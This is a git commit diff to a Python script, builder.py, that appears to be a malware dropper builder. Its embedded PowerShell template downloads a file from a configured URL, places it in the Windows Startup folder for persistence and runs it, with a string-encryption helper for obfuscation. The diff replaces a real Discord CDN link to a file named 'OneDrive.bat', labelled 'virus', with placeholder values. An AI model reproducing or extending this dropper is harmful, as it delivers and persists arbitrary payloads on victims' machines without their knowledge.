bfae8e2ec960e2975b60376c0ceed19adf542139
llc1234 <93080319+llc1234@users.noreply.github.com>
2024-02-23 23:08:47 +0100

    Update builder.py

--- builder.py
+++ builder.py
@@ -3,9 +3,9 @@ import base64
 install_code = """$us = $env:USERNAME\n$code = "Invoke-WebRequest '<url>' -OutFile <name><program>"\n$fil1 = "C:\\Users\\"\n$fil2 = Join-Path $fil1 $us"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"\nInvoke-Expression -Command $code\nMove-Item <name><program> $fil2\nStart-Process -FilePath "$fil2\\<name><program>"\n"""
 
 config = {
-    "program" : ".bat",
-    "url"     : "https://cdn.discordapp.com/attachments/975457895489626202/1210704051617009674/OneDrive.bat?ex=65eb8703&is=65d91203&hm=a80536dcc7a4ce597e659f46661493108b8c2bbebb29ce95a2fa5035596f543c&",
-    "name"    : "virus"
+    "program" : ".exe",
+    "url"     : "https://url.com/program.exe",
+    "name"    : "program-name"
 }
 
 def encrypt_string(text):
